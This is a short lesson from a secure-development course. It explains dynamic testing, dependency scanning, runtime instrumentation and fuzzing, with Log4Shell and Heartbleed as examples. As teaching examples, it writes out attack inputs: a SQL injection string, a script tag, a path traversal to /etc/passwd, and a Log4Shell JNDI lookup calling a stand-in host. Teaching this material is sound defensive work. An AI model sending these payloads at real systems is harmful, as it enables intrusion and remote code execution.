---
id: secp-runtime-and-dependency-testing
title: Runtime testing, dependencies and fuzzing
level: basic
minutes: 3
sourceLesson: secp-secure-sdlc
summary: Choose complementary tests for running configuration, vulnerable libraries and unusual parser inputs.
---

A single scanner cannot establish that an application is secure. Static analysis from the previous unit sees selected code patterns; a running deployment, third-party components and a parser fed unusual inputs provide different evidence. Match the technique to the failure you need to find.

## DAST: attacking the running app

**Dynamic application security testing (DAST)** treats the application as a black box. It crawls a running instance, then sends malicious inputs (`' OR 1=1--`, `<script>`, `../../etc/passwd`) and inspects the responses. OWASP ZAP and Burp Suite are the best-known tools.

DAST can observe runtime manifestations of problems such as:

- Missing security headers (`Content-Security-Policy`, `Strict-Transport-Security`).
- Cookies without `Secure` or `HttpOnly`.
- Verbose error pages that leak stack traces.
- Injection flaws that are actually exploitable, end to end.

Its limits mirror SAST's. It needs a deployed environment, so it runs later. It only tests what it can reach, so pages behind logins, multi-step forms or single-page-app routing are often missed unless you configure authentication and seed URLs. And when it finds a bug, it usually reports the request/endpoint rather than a reliable source-code location, unless integrated instrumentation provides one.

## SCA, IAST and fuzzing

Three more techniques complete the picture.

- **Software composition analysis (SCA)** checks your *dependencies* against databases of known vulnerabilities. Tools include Dependabot, `pip-audit`, Snyk and OWASP Dependency-Check. The supply-chain units cover dependency inventory and selection in depth.
- **Interactive testing (IAST)** instruments the running app, so when DAST or a functional test sends a payload, an agent inside the process sees exactly which line it reached. It can connect exercised requests to internal code locations, subject to instrumentation, supported runtimes and test coverage.
- **Fuzzing** throws huge numbers of random or mutated inputs at a parser and watches for crashes. Coverage-guided fuzzing with suitable memory-error detectors is particularly useful for finding memory-safety bugs. **Heartbleed** (2014, OpenSSL) was found independently by a Google engineer reviewing code and by the security firm Codenomicon using its own fuzz-testing tools. Google's **OSS-Fuzz** has since found thousands of vulnerabilities in open-source projects.

| Technique | Needs | Best at |
|---|---|---|
| SAST | Source | Injection, unsafe APIs |
| DAST | Running app | Config, headers, real exploits |
| SCA | Dependency list | Known CVEs in libraries |
| Fuzzing | Harness | Parser and memory bugs |

> [!example] Log4Shell and the limits of SAST
> In December 2021, Log4Shell (CVE-2021-44228) could enable remote code execution in affected Log4j Core configurations when attacker-controlled input such as `${jndi:ldap://evil.example/a}` reached a vulnerable lookup path. A scan limited to application code and lacking relevant dependency/flow models might miss the problem: calling `log.info(userAgent)` is normal. The flaw lived in the Log4j library, in JNDI lookup support added in July 2013 (Apache issue LOG4J2-313). Teams with an accurate dependency inventory could identify candidate exposure more directly than those reconstructing one during the incident. Comparative hour/week claims about how quickly teams responded are omitted because this review did not obtain supporting incident data.

## Key takeaways
- DAST sees responses from a running target, subject to authentication and crawl coverage.
- SCA locates known dependency advisories; IAST adds runtime instrumentation.
- Coverage-guided fuzzing exercises unusual inputs and is useful with memory-error detectors.
- Normal application logging calls can reach a vulnerable dependency such as historical Log4j Core.

## Further reading
- [ZAP scanner documentation](https://www.zaproxy.org/docs/desktop/start/features/)
- [OSS-Fuzz](https://google.github.io/oss-fuzz/)
- [Apache Log4j advisories](https://logging.apache.org/log4j/2.x/security.html)
- [Heartbleed discovery](https://heartbleed.com/)
- [Apache JNDI feature issue, July 2013](https://issues.apache.org/jira/browse/LOG4J2-313)
